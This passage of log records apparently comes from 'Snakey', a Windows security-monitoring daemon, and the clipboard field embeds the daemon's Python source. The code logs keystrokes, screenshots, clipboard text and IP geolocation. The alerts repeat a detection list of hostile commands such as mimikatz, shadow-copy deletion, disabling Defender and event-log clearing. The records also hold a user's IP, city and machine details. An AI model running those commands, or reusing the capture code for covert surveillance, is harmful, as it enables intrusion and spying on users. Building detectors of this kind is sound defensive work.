timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\")\r\n        else:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT File lookup failed: {e}\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during VT File lookup: {e}\")\r\n    return {}\r\n\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in data and isinstance(data['timestamp'], datetime):\r\n            data['timestamp'] = data['timestamp'].isoformat()\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        log_daemon_message(\"INFO\", \"Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Wazuh log file write failed: {e}\")\r\n\r\n\r\ndef send_to_elasticsearch(data):\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            # Ensure timestamp is ISO format for Elasticsearch\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            # Ensure lists are not empty before sending for Kibana visualization\r\n            # If an empty list goes, Kibana's 'is not empty' filter might not work as expected\r\n            if not data_to_send.get('alerts'):\r\n                data_to_send['alerts'] = []  # Ensure it's an empty list if no alerts\r\n\r\n            log_daemon_message(\"DEBUG\",\r\n                               f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\")\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            log_daemon_message(\"SUCCESS\", f\"Log enviado para Elasticsearch. ID: {response['_id']}\")\r\n        except ConnectionError as e:\r\n            log_daemon_message(\"ERROR\",\r\n                               f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\")\r\n            traceback.print_exc()\r\n        except AuthenticationException as e:\r\n            log_daemon_message(\"ERROR\",\r\n                               f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\r\n            traceback.print_exc()\r\n        except TransportError as e:\r\n            log_daemon_message(\"ERROR\",\r\n                               f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\")\r\n            traceback.print_exc() # <-- Added traceback\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Falha inesperada ao enviar log para Elasticsearch: {e}\")\r\n            traceback.print_exc() # <-- Added traceback\r\n    else:\r\n        log_daemon_message(\"WARNING\",\r\n                           \"Cliente Elasticsearch n\u00e3o est\u00e1 configurado ou conectado. O log n\u00e3o ser\u00e1 enviado.\")\r\n\r\n\r\n# === New: Analyze Clipboard for Sensitive Commands ===\r\ndef analyze_clipboard_for_sensitive_commands(clipboard_content, alerts_list):\r\n    \"\"\"\r\n    Analyzes clipboard content for predefined sensitive command patterns.\r\n    Adds alerts to the alerts_list if matches are found.\r\n    \"\"\"\r\n    if not clipboard_content or not isinstance(clipboard_content, str):\r\n        return alerts_list\r\n\r\n    normalized_clipboard = clipboard_content.lower().strip()\r\n\r\n    for sensitive_cmd in SENSITIVE_CMD_COMMANDS:\r\n        if sensitive_cmd.lower() in normalized_clipboard:\r\n            alerts_list.append(\r\n                f\"Sensitive CMD command detected in clipboard: \"\r\n                f\"'{clipboard_content[:100].replace('\\n', ' ').strip()}...' (matched: '{sensitive_cmd}')\"\r\n            )\r\n            # Continue to find all matches in the clipboard, do not break\r\n\r\n    return alerts_list\r\n\r\n# === New: Check Country Change Function ===\r\ndef check_country_change(current_country, alerts_list):\r\n    \"\"\"\r\n    Checks if the country has changed since the last recorded session.\r\n    Stores the current country for future comparison.\r\n    \"\"\"\r\n    try:\r\n        if os.path.exists(last_country_path):\r\n            with open(last_country_path, \"r\") as f:\r\n                last_country = f.read().strip()\r\n            if last_country and last_country != current_country:\r\n                alerts_list.append(f\"Country changed since last session: {last_country} -> {current_country}\")\r\n                log_daemon_message(\"ALERT\", f\"Country changed: {last_country} -> {current_country}\")\r\n        # Update the file for next session, even if it's the first run or country didn't change\r\n        with open(last_country_path, \"w\") as f:\r\n            f.write(current_country)\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Failed to check/update last country: {e}\")\r\n    return alerts_list\r\n\r\n# === New: Check VPN/Proxy IP Function ===\r\ndef check_vpn_proxy_ip(current_ip, alerts_list):\r\n    \"\"\"\r\n    Checks if the current public IP is in a list of known VPN/proxy IPs.\r\n    \"\"\"\r\n    if current_ip in KNOWN_VPN_IPS:\r\n        alerts_list.append(f\"Access from known VPN/proxy IP: {current_ip}\")\r\n        log_daemon_message(\"ALERT\", f\"Access from known VPN/proxy IP detected: {current_ip}\")\r\n    return alerts_list\r\n\r\n\r\n# === Main Log Collection Function ===\r\ndef collect_full_session():\r\n    current_time = datetime.now(timezone.utc)  # consistent timestamping\r\n    session_log = {\r\n        \"timestamp\": current_time.isoformat(),  # consistent timestamp\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],  # This list will be populated\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        # System Info Collection\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n\r\n        # Public IP and ISP lookup (includes country check and new VPN/Proxy IP check)\r\n        current_public_ip = None\r\n        current_country = None\r\n        try:\r\n            ip_info = requests.get(\"https://ipinfo.io/json\", timeout=5).json()\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            current_public_ip = ip_info.get(\"ip\") # Store for VPN check\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            current_country = ip_info.get(\"country\") # Store for country change check\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n                log_daemon_message(\"ALERT\", f\"Access from untrusted country: {ip_info['country']}\")\r\n\r\n            # NEW: Check for country change\r\n            if current_country:\r\n                session_log[\"alerts\"] = check_country_change(current_country, session_log[\"alerts\"])\r\n\r\n            # NEW: Check for known VPN/proxy IP\r\n            if current_public_ip:\r\n                session_log[\"alerts\"] = check_vpn_proxy_ip(current_public_ip, session_log[\"alerts\"])\r\n\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            log_daemon_message(\"WARNING\", \"IP info lookup timed out.\")\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"IP info lookup failed: {e}\")\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Unexpected error during IP info lookup: {e}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"System info collection error: {e}\")\r\n\r\n    # Clipboard Collection and Analysis\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                clipboard_content = win32clipboard.GetClipboardData()\r\n                session_log[\"clipboard\"] = clipboard_content\r\n            except TypeError:  # If clipboard is empty or non-text content\r\n                session_log[\"clipboard\"] = \"Clipboard is empty or contains non-text data.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n            # NEW: Analyze clipboard for sensitive commands\r\n            session_log[\"alerts\"] = analyze_clipboard_for_sensitive_commands(session_log[\"clipboard\"], session_log[\"alerts\"])\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Clipboard error: {e}\")\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n    # Screenshot Collection and VT Scan\r\n    screenshot_path = os.path.join(base_path, screenshot_information)  # Define path here\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            im = ImageGrab.grab()\r\n            im.save(screenshot_path)\r\n            session_log[\"screenshot_taken\"] = True\r\n            session_log[\"screenshot_hash\"] = hash_file(screenshot_path)  # Hash of screenshot image file\r\n\r\n            # VirusTotal Scan for screenshot\r\n            vt_result = vt_lookup_file(screenshot_path)\r\n            if vt_result:\r\n                session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n                if vt_result.get(\"malicious\", 0) > 0:\r\n                    session_log[\"alerts\"].append(\r\n                        f\"VirusTotal flagged screenshot file as malicious: {vt_result.get('malicious')} positives.\")\r\n                    log_daemon_message(\"ALERT\", f\"VT flagged screenshot as malicious: {vt_result.get('malicious')} positives.\")\r\n            else:\r\n                log_daemon_message(\"INFO\", \"No VirusTotal result for screenshot or scan failed.\")\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Screenshot error: {e}\")\r\n        finally:\r\n            # Clean up the temporary screenshot file\r\n            if os.path.exists(screenshot_path):\r\n                try:\r\n                    os.remove(screenshot_path)\r\n                    log_daemon_message(\"DEBUG\", f\"Removed temporary screenshot file: {screenshot_path}\")\r\n                except Exception as e:\r\n                    log_daemon_message(\"ERROR\", f\"Failed to remove temporary screenshot file: {e}\")\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n\r\n    # VirusTotal Scan for Clipboard URL (if applicable)\r\n    # Ensure clipboard is a string before checking .startswith()\r\n    if isinstance(session_log[\"clipboard\"], str) and session_log[\"clipboard\"].strip().lower().startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n            if vt_result.get(\"malicious\", 0) > 0:\r\n                session_log[\"alerts\"].append(\r\n                    f\"VirusTotal flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n                log_daemon_message(\"ALERT\", f\"VT flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n        else:\r\n            log_daemon_message(\"INFO\", \"No VirusTotal result for clipboard URL or scan failed.\")\r\n\r\n    # Keylogger\r\n    keys = []\r\n\r\n    def on_press(key):\r\n        nonlocal keys  # Ensure we modify the 'keys' list from outer scope\r\n        try:\r\n            if hasattr(key, 'char') and key.char is not None:\r\n                keys.append(key.char)\r\n            elif key == Key.space:\r\n                keys.append(' ')\r\n            elif key == Key.enter:\r\n                keys.append('[ENTER]')\r\n            elif key == Key.backspace:\r\n                keys.append('[BACKSPACE]')\r\n            elif key == Key.tab:\r\n                keys.append('[TAB]')\r\n            else:\r\n                keys.append(f\"[{str(key).replace('Key.', '')}]\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Error in on_press keylogger: {e}\")\r\n\r\n    log_daemon_message(\"INFO\", \"Keylogger running for 10 seconds. Create 'stop_snakey.txt' to terminate earlier.\")\r\n    listener = None\r\n    try:\r\n        with Listener(on_press=on_press) as listener:\r\n            start_time = time.time()\r\n            while time.time() - start_time < 10:  # Collect keystrokes for 10 seconds\r\n                time.sleep(0.5)  # Sleep for shorter intervals to check stop file more often\r\n                if check_stop_file():\r\n                    log_daemon_message(\"INFO\", \"Stop file detected. Exiting keylogger.\")\r\n                    break\r\n            listener.stop()\r\n            log_daemon_message(\"INFO\", \"Keylogger session completed.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Keylogger listener error: {e}. This might happen if not running in a desktop session or permissions issue.\")\r\n        if listener:  # Attempt to stop listener cleanly even on error\r\n            try:\r\n                listener.stop()\r\n            except Exception as stop_e:\r\n                log_daemon_message(\"WARNING\", f\"Error stopping keylogger listener: {stop_e}\")\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n\r\n    # Important Directories Check\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    # Before proceeding, ensure alerts list is not None (shouldn't be, but as a safeguard)\r\n    if session_log[\"alerts\"] is None:\r\n        session_log[\"alerts\"] = []\r\n\r\n    # --- Immutable Cold Storage (Enhanced Flat-File System) Logic ---\r\n    # 1. Prepare the full log for encryption\r\n    # We will hash the raw JSON string content of the log *before* encryption\r\n    # This hash acts as an internal integrity check within the log itself\r\n    log_string_for_internal_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n    session_log[\"_raw_log_hash\"] = hash_text(log_string_for_internal_hash)  # Store hash of raw log inside\r\n\r\n    # 2. Encrypt the entire session log\r\n    try:\r\n        encrypted_log_data = fernet.encrypt(log_string_for_internal_hash.encode('utf-8'))\r\n\r\n        # 3. Define unique filename for encrypted log file\r\n        encrypted_filename = f\"log_{current_time.strftime('%Y%m%d_%H%M%S_%f')}.enc\"\r\n        full_encrypted_filepath = os.path.join(encrypted_path, encrypted_filename)\r\n\r\n        # 4. Save the encrypted log to a file\r\n        with open(full_encrypted_filepath, \"wb\") as f_enc:\r\n            f_enc.write(encrypted_log_data)\r\n        log_daemon_message(\"SUCCESS\", f\"Encrypted log saved to: {full_encrypted_filepath}\")\r\n\r\n        # 5. Hash the encrypted file content (for the blockchain ledger)\r\n        encrypted_file_hash = hash_file(full_encrypted_filepath)\r\n        if not encrypted_file_hash:\r\n            log_daemon_message(\"ERROR\", \"Failed to hash encrypted log file. Ledger will not be updated with this log.\")\r\n            return session_log  # Exit without updating ledger for this log\r\n\r\n        # 6. Update the blockchain-style hash ledger with the encrypted file's hash\r\n        try:\r\n            ledger = []\r\n            if os.path.exists(hash_ledger_path):\r\n                try:\r\n                    with open(hash_ledger_path, \"r\") as f:\r\n                        ledger = json.load(f)\r\n                    # Convert legacy format if needed\r\n                    if ledger and isinstance(ledger[0], str):  # Check if old format (list of hashes)\r\n                        log_daemon_message(\"INFO\", \"Converting legacy hash ledger format to new dict format.\")\r\n                        converted_ledger = []\r\n                        prev_h = \"0\" * 64\r\n                        for h in ledger:\r\n                            converted_ledger.append({\r\n                                \"timestamp\": current_time.isoformat(),\r\n                                # Cannot determine true timestamp for old entries\r\n                                \"encrypted_file_hash\": h,\r\n                                \"previous_encrypted_file_hash\": prev_h,\r\n                                \"chained_hash\": hash_text(h + prev_h),\r\n                                \"encrypted_filepath\": \"legacy_path_unknown\"\r\n                            })\r\n                            prev_h = h\r\n                        ledger = converted_ledger\r\n                        log_daemon_message(\"SUCCESS\", \"Legacy hash ledger converted.\")\r\n                except json.JSONDecodeError:\r\n                    log_daemon_message(\"WARNING\", \"Existing hash ledger file is corrupt. Starting with empty ledger.\")\r\n                    ledger = []\r\n            else:\r\n                ledger = []\r\n\r\n            previous_encrypted_file_hash = ledger[-1][\"encrypted_file_hash\"] if ledger else \"0\" * 64\r\n            chained_hash_input = encrypted_file_hash + previous_encrypted_file_hash\r\n            chained_hash = hash_text(chained_hash_input)\r\n\r\n            ledger_entry = {\r\n                \"timestamp\": current_time.isoformat(),\r\n                \"encrypted_file_hash\": encrypted_file_hash,\r\n                \"previous_encrypted_file_hash\": previous_encrypted_file_hash,\r\n                \"chained_hash\": chained_hash,\r\n                \"encrypted_filepath\": full_encrypted_filepath  # Store the path to the encrypted log\r\n            }\r\n\r\n            ledger.append(ledger_entry)\r\n\r\n            with open(hash_ledger_path, \"w\") as f:\r\n                json.dump(ledger, f, indent=4)\r\n\r\n            log_daemon_message(\"SUCCESS\", \"Blockchain-style hash ledger updated with encrypted log hash.\")\r\n\r\n            # 7. Update Merkle Root\r\n            hash_list_for_merkle = [entry[\"encrypted_file_hash\"] for entry in ledger]\r\n            merkle_root = build_merkle_tree(hash_list_for_merkle)\r\n\r\n            with open(merkle_root_path, \"w\") as f:\r\n                f.write(merkle_root)\r\n\r\n            log_daemon_message(\"SUCCESS\", \"Merkle root saved (based on encrypted file hashes).\")\r\n\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to update hash ledger or Merkle root: {e}\")\r\n\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Encryption or encrypted file save error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"Encryption or encrypted file save error: {e}\")\r\n\r\n    # Return the session_log for Elasticsearch and Wazuh (containing clear-text data for these)\r\n    return session_log\r\n\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    log_daemon_message(\"INFO\", \"Starting Snakey in daemon mode...\")\r\n\r\n    # Initial check for stop file in case it exists from a previous run\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        log_daemon_message(\"INFO\", \"Found existing 'stop_snakey.txt'. Removing it to start cleanly.\")\r\n        try:\r\n            os.remove(stop_file_path)\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to remove existing stop file: {e}\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            log_daemon_message(\"INFO\", \"Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()  # This now handles saving encrypted logs and updating ledger\r\n\r\n        # Send the (original, unencrypted) session_log to Wazuh and Elasticsearch\r\n        # These systems need the clear-text data for analysis and display\r\n        log_to_wazuh_file(session_log)\r\n        send_to_elasticsearch(session_log)\r\n\r\n        log_daemon_message(\"INFO\", f\"Sleeping for 15 seconds before next collection at {datetime.now().isoformat()}...\")\r\n        time.sleep(3)\r\n\r\n    # Final cleanup of stop file\r\n    if os.path.exists(stop_file_path):\r\n        try:\r\n            os.remove(stop_file_path)\r\n            log_daemon_message(\"INFO\", \"Stop file removed on graceful exit.\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to remove stop file during exit: {e}\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Access from known VPN/proxy IP: 89.214.145.78", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'format c:')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'del /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'rmdir /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net user')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net localgroup administrators')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'taskkill /f /im')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'schtasks /create')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'reg delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mimikatz')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'certutil -urlcache -f -split')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wmic shadowcopy delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'vssadmin delete shadows')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'powershell -nop -w hidden -c')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'invoke-expression')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'set-mppreference -disablerealtimemonitoring $true')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bcdedit /set {current} safeboot network')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mshta.exe http')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bitsadmin /transfer')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wevtutil cl system')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'cipher /w')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'sdelete -z')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (795 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "fa7e5b21da57914f38389845b114538f80d2abe45c8e88b17ceb214da1099591", "screenshot_hash": "935687061823fb173468603938a04b37967d01783a8bab9eba0a9929a5431333", "_raw_log_hash": "66f3faade38685201c2330c2ef1c49c6447c9e6e0e98f6602e406d4e711615ba"}
{"timestamp": "2025-06-11T17:09:09.644188+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nimport sys\r\nimport threading\r\nimport shutil\r\nimport traceback\r\nimport logging\r\nfrom logging.handlers import RotatingFileHandler, TimedRotatingFileHandler\r\nfrom datetime import datetime, timedelta, timezone\r\nfrom requests import get as requests_get, post as requests_post # Renamed to avoid conflict with `get` from `requests`\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests # Still needed for general requests like ipinfo.io\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException, TransportError\r\nimport ssl # Not directly used for client, but good to have\r\nimport tempfile # For atomic writes\r\n\r\n\r\n# === Configuration Loading ===\r\n# Default configuration values\r\nDEFAULT_CONFIG = {\r\n    \"base_path\": \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\",\r\n    \"known_countries\": [\"Portugal\"], # Example country for testing\r\n    \"known_vpn_ips\": [\"89.214.145.78\", \"123.45.67.89\"], # Example VPN IPs\r\n    \"elastic_host\": \"localhost\",\r\n    \"elastic_port\": 9200,\r\n    \"log_level\": \"INFO\", # DEBUG, INFO, WARNING, ERROR, CRITICAL\r\n    \"time_sleep_seconds\": 3, # Main daemon loop sleep interval\r\n    \"min_free_disk_mb\": 100, # Minimum free disk space to operate\r\n    \"vt_api_key\": None, # Should be loaded from ENV\r\n    \"elastic_user\": None, # Should be loaded from ENV\r\n    \"elastic_password\": None # Should be loaded from ENV\r\n}\r\n\r\n# --- Paths derived from config ---\r\n# These will be set after config is loaded\r\nconfig = {} # Placeholder, will be populated by load_config\r\n\r\n# --- Global Keylogger Variables ---\r\nKEYLOGGER_KEYS = []\r\nKEYLOGGER_LISTENER = None # Will hold the pynput Listener instance\r\nKEYLOGGER_STOP_EVENT = threading.Event() # To signal the keylogger thread to stop\r\n\r\n# === Logger Setup (using Python's logging module) ===\r\n# This needs to be set up early before any `logger.info` calls\r\nlogger = logging.getLogger('snakey_daemon')\r\n\r\nclass JsonFormatter(logging.Formatter):\r\n    \"\"\"Custom JSON formatter for structured logs.\"\"\"\r\n    def format(self, record):\r\n        log_record = {\r\n            \"timestamp\": datetime.fromtimestamp(record.created, tz=timezone.utc).isoformat(),\r\n            \"level\": record.levelname,\r\n            \"message\": record.getMessage(),\r\n            \"logger_name\": record.name,\r\n        }\r\n        if record.exc_info:\r\n            log_record[\"exception\"] = self.formatException(record.exc_info)\r\n        if record.funcName:\r\n            log_record[\"function\"] = record.funcName\r\n        if record.lineno:\r\n            log_record[\"line\"] = record.lineno\r\n        if record.pathname:\r\n            log_record[\"file\"] = record.pathname\r\n        \r\n        # Add any extra dictionary fields passed to the logger via the 'extra' keyword\r\n        if hasattr(record, 'extra') and isinstance(record.extra, dict):\r\n            # The 'extra' dictionary contains the keys directly, so just update\r\n            log_record.update(record.extra)\r\n\r\n        return json.dumps(log_record, default=str) # default=str handles datetime, etc.\r\n\r\ndef setup_logging(log_level_str, log_file_path):\r\n    \"\"\"Configures the main logger for the daemon.\"\"\"\r\n    try:\r\n        logger.setLevel(getattr(logging, log_level_str.upper()))\r\n    except AttributeError:\r\n        logger.setLevel(logging.INFO) # Default to INFO if level is invalid\r\n        logger.warning(f\"Invalid SNAKEY_LOG_LEVEL '{log_level_str}'. Defaulting to INFO.\")\r\n\r\n    # Prevent adding handlers multiple times if setup_logging is called more than once\r\n    if not logger.handlers:\r\n        # File Handler with Time-based Rotation (daily)\r\n        file_handler = TimedRotatingFileHandler(log_file_path,\r\n                                                when=\"midnight\",\r\n                                                interval=1, # Rotate daily\r\n                                                backupCount=5) # Keep up to 5 rotated log files\r\n        file_handler.setLevel(logging.DEBUG) # Log all debug messages to file\r\n        file_handler.setFormatter(JsonFormatter())\r\n        logger.addHandler(file_handler)\r\n\r\n        # Console Handler\r\n        console_handler = logging.StreamHandler(sys.stdout)\r\n        console_handler.setLevel(logging.INFO) # Only INFO and above to console\r\n        console_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')\r\n        console_handler.setFormatter(console_formatter)\r\n        logger.addHandler(console_handler)\r\n\r\n# Global exception handler to log any unhandled exceptions\r\ndef handle_unhandled_exception(exc_type, exc_value, exc_traceback):\r\n    if issubclass(exc_type, KeyboardInterrupt):\r\n        # Don't log KeyboardInterrupt, let default handler deal with it\r\n        sys.__excepthook__(exc_type, exc_value, exc_traceback)\r\n        return\r\n    logger.critical(\"Unhandled exception caught!\", exc_info=(exc_type, exc_value, exc_traceback))\r\n\r\nsys.excepthook = handle_unhandled_exception\r\n\r\ndef load_config(config_file_path: str) -> dict:\r\n    \"\"\"Loads configuration from a JSON file and environment variables.\"\"\"\r\n    loaded_config = DEFAULT_CONFIG.copy()\r\n\r\n    if os.path.exists(config_file_path):\r\n        try:\r\n            with open(config_file_path, \"r\", encoding='utf-8') as f:\r\n                file_config = json.load(f)\r\n                loaded_config.update(file_config)\r\n            logger.info(f\"Configuration loaded from {config_file_path}\")\r\n        except json.JSONDecodeError:\r\n            logger.error(f\"Error decoding config file {config_file_path}. Using default values.\")\r\n        except IOError as e:\r\n            logger.error(f\"Error reading config file {config_file_path}: {e}. Using default values.\")\r\n        except Exception as e:\r\n            logger.critical(f\"Unexpected error parsing config file: {e}\", exc_info=True)\r\n            sys.exit(1) # Critical error, exit\r\n\r\n    # Override with Environment Variables for sensitive info (best practice)\r\n    loaded_config[\"vt_api_key\"] = os.getenv(\"SNAKEY_VT_API_KEY\", loaded_config[\"vt_api_key\"])\r\n    